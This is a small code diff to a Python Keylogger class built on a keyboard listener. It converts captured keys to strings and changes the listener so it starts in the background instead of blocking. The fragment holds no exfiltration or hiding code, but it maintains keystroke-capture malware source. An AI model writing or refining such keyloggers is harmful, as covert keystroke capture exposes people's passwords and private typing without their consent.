@@ -34,7 +34,7 @@ class Keylogger:
         if key in substitution.keys():
             return substitution[key]
         else:
-            return key
+            return str(key)
 
     def __onKeyPress(self, key):
         try:
@@ -53,8 +53,7 @@ class Keylogger:
         listener = keyboard.Listener(
             on_release=self.__onKeyPress)
         
-        with listener as kb_listner:
-            kb_listner.join()
+        listener.start()
 
 
 if __name__ == "__main__":
